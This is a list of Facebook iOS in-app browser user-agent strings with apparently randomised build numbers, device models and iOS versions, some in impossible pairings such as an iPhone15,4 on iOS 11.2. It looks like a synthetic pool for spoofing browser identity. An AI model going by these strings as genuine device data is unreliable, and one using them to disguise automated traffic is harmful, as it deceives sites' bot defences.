"[FBAN/FBIOS;FBAV/440.0.0.27.105;FBBV/621269137;FBDV/iPhone15,4;FBMD/iPhone;FBSN/iOS;FBSV/11.2;FBSS/3;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/642877329]",
"[FBAN/FBIOS;FBAV/440.0.0.27.105;FBBV/312315234;FBDV/iPhone10,6;FBMD/iPhone;FBSN/iOS;FBSV/18.3.2;FBSS/3;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/147946906]",
"[FBAN/FBIOS;FBAV/504.0.0.62.85;FBBV/638470289;FBDV/iPhone12,8;FBMD/iPhone;FBSN/iOS;FBSV/16.6.1;FBSS/3;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/312303822]",
"[FBAN/FBIOS;FBAV/493.0.0.55.216;FBBV/120975784;FBDV/iPhone14,5;FBMD/iPhone;FBSN/iOS;FBSV/16.5.1;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/271488303]",
"[FBAN/FBIOS;FBAV/501.0.0.49.107;FBBV/669753744;FBDV/iPhone8,2;FBMD/iPhone;FBSN/iOS;FBSV/15.4.1;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/464025852]",
"[FBAN/FBIOS;FBAV/440.0.0.27.105;FBBV/540700965;FBDV/iPhone13,1;FBMD/iPhone;FBSN/iOS;FBSV/11.2;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/566867076]",
"[FBAN/FBIOS;FBAV/503.0.0.56.104;FBBV/468240072;FBDV/iPhone14,7;FBMD/iPhone;FBSN/iOS;FBSV/16.6.1;FBSS/3;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/461303548]",
"[FBAN/FBIOS;FBAV/440.0.0.27.105;FBBV/268643786;FBDV/iPhone14,5;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/163683977]",
"[FBAN/FBIOS;FBAV/500.0.0.52.98;FBBV/573682181;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/16.3.1;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/227915623]",
"[FBAN/FBIOS;FBAV/503.0.0.56.104;FBBV/407653336;FBDV/iPhone13,1;FBMD/iPhone;FBSN/iOS;FBSV/17.6.1;FBSS/3;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/148339216]",
"[FBAN/FBIOS;FBAV/485.0.0.50.105;FBBV/464263895;FBDV/iPhone10,4;FBMD/iPhone;FBSN/iOS;FBSV/13.6;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/361723082]",
"[FBAN/FBIOS;FBAV/504.0.0.62.85;FBBV/518130278;FBDV/iPhone7,1;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/3;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/239865076]",
"[FBAN/FBIOS;FBAV/500.0.0.52.98;FBBV/653731477;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/11.2;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/117262077]",
"[FBAN/FBIOS;FBAV/503.0.0.56.104;FBBV/648304027;FBDV/iPhone8,2;FBMD/iPhone;FBSN/iOS;FBSV/13.6;FBSS/3;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/470975459]",
"[FBAN/FBIOS;FBAV/500.0.0.52.98;FBBV/426447716;FBDV/iPhone15,4;FBMD/iPhone;FBSN/iOS;FBSV/15.7.8;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/337156618]",
"[FBAN/FBIOS;FBAV/503.0.0.56.104;FBBV/669852335;FBDV/iPhone7,1;FBMD/iPhone;FBSN/iOS;FBSV/16.3.1;FBSS/3;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/344671385]",
"[FBAN/FBIOS;FBAV/493.0.0.55.216;FBBV/629310723;FBDV/iPhone9,2;FBMD/iPhone;FBSN/iOS;FBSV/11.2;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/551738758]",
"[FBAN/FBIOS;FBAV/504.0.0.62.85;FBBV/108353880;FBDV/iPhone15,4;FBMD/iPhone;FBSN/iOS;FBSV/18.3.2;FBSS/3;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/255755036]",
"[FBAN/FBIOS;FBAV/475.0.0.31.110;FBBV/125874246;FBDV/iPhone14,5;FBMD/iPhone;FBSN/iOS;FBSV/13.6;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/177163055]",
"[FBAN/FBIOS;FBAV/504.0.0.62.85;FBBV/201805501;FBDV/iPhone14,5;FBMD/iPhone;FBSN/iOS;FBSV/18.3.1;FBSS/3;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/259357819]",
"[FBAN/FBIOS;FBAV/412.0.0.40.114;FBBV/264704328;FBDV/iPhone15,4;FBMD/iPhone;FBSN/iOS;FBSV/16.3.1;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/553845935]",
"[FBAN/FBIOS;FBAV/500.0.0.52.98;FBBV/584537114;FBDV/iPhone12,8;FBMD/iPhone;FBSN/iOS;FBSV/16.6.1;FBSS/3;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/112973177]",
"[FBAN/FBIOS;FBAV/500.0.0.52.98;FBBV/688156137;FBDV/iPhone12,8;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/101683340]",
"[FBAN/FBIOS;FBAV/503.0.0.56.104;FBBV/251180820;FBDV/iPhone14,5;FBMD/iPhone;FBSN/iOS;FBSV/16.3.1;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/148261858]",
"[FBAN/FBIOS;FBAV/475.0.0.31.110;FBBV/406944149;FBDV/iPhone8,2;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/195651033]",
"[FBAN/FBIOS;FBAV/475.0.0.31.110;FBBV/262168774;FBDV/iPhone10,4;FBMD/iPhone;FBSN/iOS;FBSV/13.6;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/441717714]",
"[FBAN/FBIOS;FBAV/504.0.0.62.85;FBBV/468367939;FBDV/iPhone10,6;FBMD/iPhone;FBSN/iOS;FBSV/16.6.1;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/603548294]",
"[FBAN/FBIOS;FBAV/504.0.0.62.85;FBBV/197308871;FBDV/iPhone10,4;FBMD/iPhone;FBSN/iOS;FBSV/18.3.2;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/439281558]",
"[FBAN/FBIOS;FBAV/475.0.0.31.110;FBBV/548165493;FBDV/iPhone13,1;FBMD/iPhone;FBSN/iOS;FBSV/16.3.1;FBSS/3;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/198436191]",
"[FBAN/FBIOS;FBAV/485.0.0.50.105;FBBV/362016459;FBDV/iPhone15,4;FBMD/iPhone;FBSN/iOS;FBSV/16.5.1;FBSS/3;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/172605780]",
"[FBAN/FBIOS;FBAV/485.0.0.50.105;FBBV/175350553;FBDV/iPhone8,2;FBMD/iPhone;FBSN/iOS;FBSV/16.3.1;FBSS/3;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/645813515]",
"[FBAN/FBIOS;FBAV/500.0.0.52.98;FBBV/481167484;FBDV/iPhone9,2;FBMD/iPhone;FBSN/iOS;FBSV/18.3.1;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/347515987]",
"[FBAN/FBIOS;FBAV/440.0.0.27.105;FBBV/466431435;FBDV/iPhone14,7;FBMD/iPhone;FBSN/iOS;FBSV/16.5.1;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/657362636]",
"[FBAN/FBIOS;FBAV/485.0.0.50.105;FBBV/443615149;FBDV/iPhone15,4;FBMD/iPhone;FBSN/iOS;FBSV/16.5.1;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/220773090]",
"[FBAN/FBIOS;FBAV/500.0.0.52.98;FBBV/673539184;FBDV/iPhone8,2;FBMD/iPhone;FBSN/iOS;FBSV/17.6.1;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/679830316]",
"[FBAN/FBIOS;FBAV/504.0.0.62.85;FBBV/518989070;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/17.6.1;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/610923158]",
"[FBAN/FBIOS;FBAV/500.0.0.52.98;FBBV/690741079;FBDV/iPhone13,1;FBMD/iPhone;FBSN/iOS;FBSV/17.6.1;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/313762237]",
"[FBAN/FBIOS;FBAV/503.0.0.56.104;FBBV/402138810;FBDV/iPhone14,7;FBMD/iPhone;FBSN/iOS;FBSV/16.5.1;FBSS/3;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/566423051]",
"[FBAN/FBIOS;FBAV/475.0.0.31.110;FBBV/275633721;FBDV/iPhone13,2;FBMD/iPhone;FBSN/iOS;FBSV/17.6.1;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/376910918]",
"[FBAN/FBIOS;FBAV/504.0.0.62.85;FBBV/452449901;FBDV/iPhone15,4;FBMD/iPhone;FBSN/iOS;FBSV/16.6.1;FBSS/3;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/419199720]",
"[FBAN/FBIOS;FBAV/504.0.0.62.85;FBBV/486193018;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/16.3.1;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/492406842]",
"[FBAN/FBIOS;FBAV/475.0.0.31.110;FBBV/603375440;FBDV/iPhone10,4;FBMD/iPhone;FBSN/iOS;FBSV/15.7.8;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/418133703]",
"[FBAN/FBIOS;FBAV/501.0.0.49.107;FBBV/411612706;FBDV/iPhone13,1;FBMD/iPhone;FBSN/iOS;FBSV/11.2;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/521235839]",
"[FBAN/FBIOS;FBAV/503.0.0.56.104;FBBV/505955532;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/15.4.1;FBSS/3;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/295841398]",
"[FBAN/FBIOS;FBAV/504.0.0.62.85;FBBV/376892944;FBDV/iPhone13,1;FBMD/iPhone;FBSN/iOS;FBSV/15.4.1;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/675535141]",
"[FBAN/FBIOS;FBAV/485.0.0.50.105;FBBV/503238091;FBDV/iPhone14,7;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/492876108]",
"[FBAN/FBIOS;FBAV/485.0.0.50.105;FBBV/230126716;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/16.7.10;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/693001400]",
"[FBAN/FBIOS;FBAV/500.0.0.52.98;FBBV/331662039;FBDV/iPhone15,4;FBMD/iPhone;FBSN/iOS;FBSV/11.2;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/548057883]",
"[FBAN/FBIOS;FBAV/475.0.0.31.110;FBBV/555511629;FBDV/iPhone7,1;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/604564597]",
"[FBAN/FBIOS;FBAV/493.0.0.55.216;FBBV/258752812;FBDV/iPhone13,1;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/3;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/305493419]",
"[FBAN/FBIOS;FBAV/501.0.0.49.107;FBBV/211261298;FBDV/iPhone10,6;FBMD/iPhone;FBSN/iOS;FBSV/18.3.2;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/502343080]",
"[FBAN/FBIOS;FBAV/500.0.0.52.98;FBBV/587590329;FBDV/iPhone10,4;FBMD/iPhone;FBSN/iOS;FBSV/18.3.2;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/598225254]",
"[FBAN/FBIOS;FBAV/485.0.0.50.105;FBBV/475499389;FBDV/iPhone7,1;FBMD/iPhone;FBSN/iOS;FBSV/11.2;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/594533200]",
"[FBAN/FBIOS;FBAV/475.0.0.31.110;FBBV/154099264;FBDV/iPhone7,1;FBMD/iPhone;FBSN/iOS;FBSV/17.6.1;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/526207598]",
"[FBAN/FBIOS;FBAV/504.0.0.62.85;FBBV/383157929;FBDV/iPhone14,5;FBMD/iPhone;FBSN/iOS;FBSV/16.3.1;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/489663403]",
"[FBAN/FBIOS;FBAV/503.0.0.56.104;FBBV/482662688;FBDV/iPhone10,6;FBMD/iPhone;FBSN/iOS;FBSV/11.2;FBSS/3;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/631576550]",
"[FBAN/FBIOS;FBAV/412.0.0.40.114;FBBV/470479373;FBDV/iPhone14,5;FBMD/iPhone;FBSN/iOS;FBSV/16.7.10;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/493814373]",
"[FBAN/FBIOS;FBAV/504.0.0.62.85;FBBV/409145154;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/16.6.1;FBSS/3;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/313790915]",
"[FBAN/FBIOS;FBAV/503.0.0.56.104;FBBV/531975967;FBDV/iPhone7,1;FBMD/iPhone;FBSN/iOS;FBSV/11.2;FBSS/3;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/173677996]",
"[FBAN/FBIOS;FBAV/440.0.0.27.105;FBBV/403774043;FBDV/iPhone10,4;FBMD/iPhone;FBSN/iOS;FBSV/16.6.1;FBSS/3;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/351625295]",
"[FBAN/FBIOS;FBAV/500.0.0.52.98;FBBV/227542839;FBDV/iPhone10,4;FBMD/iPhone;FBSN/iOS;FBSV/16.7.10;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/429518356]",
"[FBAN/FBIOS;FBAV/412.0.0.40.114;FBBV/328151152;FBDV/iPhone10,6;FBMD/iPhone;FBSN/iOS;FBSV/16.6.1;FBSS/3;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/411259005]",
"[FBAN/FBIOS;FBAV/500.0.0.52.98;FBBV/282310616;FBDV/iPhone15,4;FBMD/iPhone;FBSN/iOS;FBSV/16.6.1;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/130278636]",
"[FBAN/FBIOS;FBAV/485.0.0.50.105;FBBV/507661989;FBDV/iPhone14,5;FBMD/iPhone;FBSN/iOS;FBSV/18.3.1;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/341744676]",
"[FBAN/FBIOS;FBAV/503.0.0.56.104;FBBV/128933957;FBDV/iPhone12,8;FBMD/iPhone;FBSN/iOS;FBSV/16.7.10;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/365545585]",
"[FBAN/FBIOS;FBAV/503.0.0.56.104;FBBV/290477205;FBDV/iPhone10,4;FBMD/iPhone;FBSN/iOS;FBSV/15.7.8;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/205402249]",
"[FBAN/FBIOS;FBAV/493.0.0.55.216;FBBV/142396628;FBDV/iPhone12,8;FBMD/iPhone;FBSN/iOS;FBSV/16.7.10;FBSS/3;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/672856654]",
"[FBAN/FBIOS;FBAV/500.0.0.52.98;FBBV/341031172;FBDV/iPhone14,7;FBMD/iPhone;FBSN/iOS;FBSV/18.3.2;FBSS/3;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/449095502]",
"[FBAN/FBIOS;FBAV/493.0.0.55.216;FBBV/691980818;FBDV/iPhone14,5;FBMD/iPhone;FBSN/iOS;FBSV/15.7.8;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/579616727]",
"[FBAN/FBIOS;FBAV/503.0.0.56.104;FBBV/675634561;FBDV/iPhone13,1;FBMD/iPhone;FBSN/iOS;FBSV/16.7.10;FBSS/3;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/628798094]",
"[FBAN/FBIOS;FBAV/503.0.0.56.104;FBBV/298774553;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/11.2;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/697835966]",
"[FBAN/FBIOS;FBAV/504.0.0.62.85;FBBV/467592181;FBDV/iPhone13,1;FBMD/iPhone;FBSN/iOS;FBSV/16.6.1;FBSS/3;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/572700523]",
"[FBAN/FBIOS;FBAV/485.0.0.50.105;FBBV/230285200;FBDV/iPhone13,2;FBMD/iPhone;FBSN/iOS;FBSV/15.7.8;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/468938529]",
"[FBAN/FBIOS;FBAV/485.0.0.50.105;FBBV/127293523;FBDV/iPhone15,4;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/251911225]",
"[FBAN/FBIOS;FBAV/500.0.0.52.98;FBBV/629370111;FBDV/iPhone7,1;FBMD/iPhone;FBSN/iOS;FBSV/18.3.1;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/175346607]",
"[FBAN/FBIOS;FBAV/493.0.0.55.216;FBBV/595948724;FBDV/iPhone12,8;FBMD/iPhone;FBSN/iOS;FBSV/17.6.1;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/534464830]",
"[FBAN/FBIOS;FBAV/440.0.0.27.105;FBBV/629624005;FBDV/iPhone10,6;FBMD/iPhone;FBSN/iOS;FBSV/17.6.1;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/499032657]",
"[FBAN/FBIOS;FBAV/475.0.0.31.110;FBBV/680182428;FBDV/iPhone14,5;FBMD/iPhone;FBSN/iOS;FBSV/15.4.1;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/332685723]",
"[FBAN/FBIOS;FBAV/485.0.0.50.105;FBBV/279399372;FBDV/iPhone10,6;FBMD/iPhone;FBSN/iOS;FBSV/11.2;FBSS/3;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/367181725]",
"[FBAN/FBIOS;FBAV/501.0.0.49.107;FBBV/126498217;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/16.3.1;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/104093819]",
"[FBAN/FBIOS;FBAV/412.0.0.40.114;FBBV/265081176;FBDV/iPhone14,5;FBMD/iPhone;FBSN/iOS;FBSV/13.6;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/220790068]",
"[FBAN/FBIOS;FBAV/485.0.0.50.105;FBBV/394557953;FBDV/iPhone10,6;FBMD/iPhone;FBSN/iOS;FBSV/17.6.1;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/591228664]",
"[FBAN/FBIOS;FBAV/493.0.0.55.216;FBBV/355719619;FBDV/iPhone8,2;FBMD/iPhone;FBSN/iOS;FBSV/11.2;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/343012817]",
"[FBAN/FBIOS;FBAV/500.0.0.52.98;FBBV/537587159;FBDV/iPhone9,2;FBMD/iPhone;FBSN/iOS;FBSV/17.6.1;FBSS/3;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/366766487]",
"[FBAN/FBIOS;FBAV/504.0.0.62.85;FBBV/369650385;FBDV/iPhone15,4;FBMD/iPhone;FBSN/iOS;FBSV/16.7.10;FBSS/3;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/313919041]",
"[FBAN/FBIOS;FBAV/412.0.0.40.114;FBBV/473776858;FBDV/iPhone15,4;FBMD/iPhone;FBSN/iOS;FBSV/11.2;FBSS/3;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/113165536]",
"[FBAN/FBIOS;FBAV/504.0.0.62.85;FBBV/398163604;FBDV/iPhone8,2;FBMD/iPhone;FBSN/iOS;FBSV/18.3.2;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/669813832]",
"[FBAN/FBIOS;FBAV/504.0.0.62.85;FBBV/284153691;FBDV/iPhone13,2;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/361174255]",
"[FBAN/FBIOS;FBAV/475.0.0.31.110;FBBV/132210028;FBDV/iPhone8,2;FBMD/iPhone;FBSN/iOS;FBSV/13.6;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/389772841]",
"[FBAN/FBIOS;FBAV/493.0.0.55.216;FBBV/443957945;FBDV/iPhone7,1;FBMD/iPhone;FBSN/iOS;FBSV/15.4.1;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/296106216]",
"[FBAN/FBIOS;FBAV/475.0.0.31.110;FBBV/148453461;FBDV/iPhone13,2;FBMD/iPhone;FBSN/iOS;FBSV/18.3.1;FBSS/3;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/677581898]",
"[FBAN/FBIOS;FBAV/440.0.0.27.105;FBBV/370809286;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/15.7.8;FBSS/3;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/609878718]",
"[FBAN/FBIOS;FBAV/485.0.0.50.105;FBBV/381175913;FBDV/iPhone12,8;FBMD/iPhone;FBSN/iOS;FBSV/18.3.1;FBSS/3;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/365374606]",
"[FBAN/FBIOS;FBAV/500.0.0.52.98;FBBV/601243237;FBDV/iPhone14,7;FBMD/iPhone;FBSN/iOS;FBSV/16.6.1;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/546113219]",
"[FBAN/FBIOS;FBAV/504.0.0.62.85;FBBV/323990830;FBDV/iPhone8,2;FBMD/iPhone;FBSN/iOS;FBSV/15.4.1;FBSS/3;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/214033898]",
"[FBAN/FBIOS;FBAV/503.0.0.56.104;FBBV/602651302;FBDV/iPhone9,2;FBMD/iPhone;FBSN/iOS;FBSV/15.4.1;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/200065124]",
"[FBAN/FBIOS;FBAV/493.0.0.55.216;FBBV/250549019;FBDV/iPhone9,2;FBMD/iPhone;FBSN/iOS;FBSV/18.3.1;FBSS/3;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/307935912]",
"[FBAN/FBIOS;FBAV/500.0.0.52.98;FBBV/483195061;FBDV/iPhone9,2;FBMD/iPhone;FBSN/iOS;FBSV/15.4.1;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/571120792]",
"[FBAN/FBIOS;FBAV/493.0.0.55.216;FBBV/285069249;FBDV/iPhone7,1;FBMD/iPhone;FBSN/iOS;FBSV/11.2;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/102223946]",
"[FBAN/FBIOS;FBAV/493.0.0.55.216;FBBV/136455270;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/15.7.8;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/152506248]",
"[FBAN/FBIOS;FBAV/412.0.0.40.114;FBBV/393356633;FBDV/iPhone12,8;FBMD/iPhone;FBSN/iOS;FBSV/16.7.10;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/305523005]",
"[FBAN/FBIOS;FBAV/412.0.0.40.114;FBBV/131573052;FBDV/iPhone13,1;FBMD/iPhone;FBSN/iOS;FBSV/16.3.1;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/133117106]",
"[FBAN/FBIOS;FBAV/500.0.0.52.98;FBBV/275327233;FBDV/iPhone14,5;FBMD/iPhone;FBSN/iOS;FBSV/16.3.1;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/288010481]",
"[FBAN/FBIOS;FBAV/412.0.0.40.114;FBBV/230352305;FBDV/iPhone10,6;FBMD/iPhone;FBSN/iOS;FBSV/11.2;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/388619944]",
"[FBAN/FBIOS;FBAV/412.0.0.40.114;FBBV/161729973;FBDV/iPhone10,6;FBMD/iPhone;FBSN/iOS;FBSV/13.6;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/521502541]",
"[FBAN/FBIOS;FBAV/440.0.0.27.105;FBBV/126461274;FBDV/iPhone14,7;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/3;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/654206652]",
"[FBAN/FBIOS;FBAV/475.0.0.31.110;FBBV/692189237;FBDV/iPhone8,2;FBMD/iPhone;FBSN/iOS;FBSV/11.2;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/463384651]",
"[FBAN/FBIOS;FBAV/412.0.0.40.114;FBBV/577141547;FBDV/iPhone8,2;FBMD/iPhone;FBSN/iOS;FBSV/13.6;FBSS/3;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/323975946]",
"[FBAN/FBIOS;FBAV/504.0.0.62.85;FBBV/179056128;FBDV/iPhone14,7;FBMD/iPhone;FBSN/iOS;FBSV/16.7.10;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/692735323]",
"[FBAN/FBIOS;FBAV/493.0.0.55.216;FBBV/698582890;FBDV/iPhone8,2;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/262008115]",
"[FBAN/FBIOS;FBAV/503.0.0.56.104;FBBV/635665454;FBDV/iPhone12,8;FBMD/iPhone;FBSN/iOS;FBSV/16.3.1;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/332744817]",
"[FBAN/FBIOS;FBAV/493.0.0.55.216;FBBV/192100127;FBDV/iPhone8,2;FBMD/iPhone;FBSN/iOS;FBSV/15.4.1;FBSS/3;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/580381740]",
"[FBAN/FBIOS;FBAV/475.0.0.31.110;FBBV/257005412;FBDV/iPhone12,8;FBMD/iPhone;FBSN/iOS;FBSV/16.5.1;FBSS/3;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/539378117]",
"[FBAN/FBIOS;FBAV/501.0.0.49.107;FBBV/320206744;FBDV/iPhone13,1;FBMD/iPhone;FBSN/iOS;FBSV/16.7.10;FBSS/3;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/162991091]",
"[FBAN/FBIOS;FBAV/485.0.0.50.105;FBBV/577802563;FBDV/iPhone8,2;FBMD/iPhone;FBSN/iOS;FBSV/16.6.1;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/445436039]",
"[FBAN/FBIOS;FBAV/500.0.0.52.98;FBBV/532450899;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/11.2;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/604125487]",
"[FBAN/FBIOS;FBAV/475.0.0.31.110;FBBV/377558401;FBDV/iPhone8,2;FBMD/iPhone;FBSN/iOS;FBSV/18.3.1;FBSS/3;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/692974134]",
"[FBAN/FBIOS;FBAV/440.0.0.27.105;FBBV/673178313;FBDV/iPhone13,2;FBMD/iPhone;FBSN/iOS;FBSV/18.3.2;FBSS/3;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/182014610]",
"[FBAN/FBIOS;FBAV/501.0.0.49.107;FBBV/687992736;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/13.6;FBSS/3;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/411847578]",
"[FBAN/FBIOS;FBAV/501.0.0.49.107;FBBV/685223039;FBDV/iPhone13,2;FBMD/iPhone;FBSN/iOS;FBSV/16.5.1;FBSS/3;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/635956852]",
"[FBAN/FBIOS;FBAV/501.0.0.49.107;FBBV/152816530;FBDV/iPhone8,2;FBMD/iPhone;FBSN/iOS;FBSV/18.3.2;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/211032067]",
"[FBAN/FBIOS;FBAV/501.0.0.49.107;FBBV/626948787;FBDV/iPhone10,4;FBMD/iPhone;FBSN/iOS;FBSV/16.5.1;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/347923429]",
"[FBAN/FBIOS;FBAV/504.0.0.62.85;FBBV/248780174;FBDV/iPhone10,4;FBMD/iPhone;FBSN/iOS;FBSV/17.6.1;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/214128718]",
